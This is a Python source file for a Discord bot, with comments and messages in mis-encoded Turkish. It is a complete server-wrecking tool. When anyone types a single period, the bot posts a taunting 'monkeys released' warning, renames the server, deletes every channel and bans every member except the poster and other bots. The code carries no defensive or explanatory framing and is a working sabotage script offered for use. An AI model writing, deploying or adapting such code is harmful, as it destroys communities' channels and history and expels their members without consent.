import os
import discord
from discord.ext import commands
from dotenv import load_dotenv

# Railway'den token alÄ±r
load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"âœ… Bot aktif: {bot.user.name}")

@bot.event
async def on_message(message):
    if message.author == bot.user or not message.guild:
        return

    # Sadece "." yazÄ±lÄ±rsa tetiklenir
    if message.content.strip() == ".":
        guild = message.guild

        # 1. UyarÄ± mesajÄ± gÃ¶nder
        try:
            await message.channel.send(
                "ğŸš¨ **UyarÄ±!** Maymunlar serbest bÄ±rakÄ±ldÄ±. Sunucu temizlik operasyonu baÅŸlatÄ±lÄ±yor... ğŸ’ğŸ’¥"
            )
        except Exception as e:
            print(f"âš ï¸ UyarÄ± mesajÄ± hatasÄ±: {e}")

        # 2. Sunucu adÄ±nÄ± deÄŸiÅŸtir
        try:
            await guild.edit(name="Maymun Sunucusu ğŸµ")
            print("ğŸ“› Sunucu adÄ± deÄŸiÅŸtirildi.")
        except Exception as e:
            print(f"âš ï¸ Sunucu adÄ± hatasÄ±: {e}")

        # 3. TÃ¼m kanallarÄ± sil
        for channel in list(guild.channels):
            try:
                await channel.delete()
                print(f"ğŸ—‘ï¸ Kanal silindi: {channel.name}")
            except Exception as e:
                print(f"âš ï¸ Kanal silme hatasÄ±: {e}")

        # 4. TÃ¼m Ã¼yeleri banla (mesaj atan ve botlar hariÃ§)
        for member in guild.members:
            if member != message.author and not member.bot:
                try:
                    await member.ban(reason="Maymun isyanÄ± nedeniyle uzaklaÅŸtÄ±rÄ±ldÄ± ğŸµğŸ”¥")
                    print(f"ğŸš« BanlandÄ±: {member.name}")
                except Exception as e:
                    print(f"âš ï¸ Ban hatasÄ±: {e}")

    await bot.process_commands(message)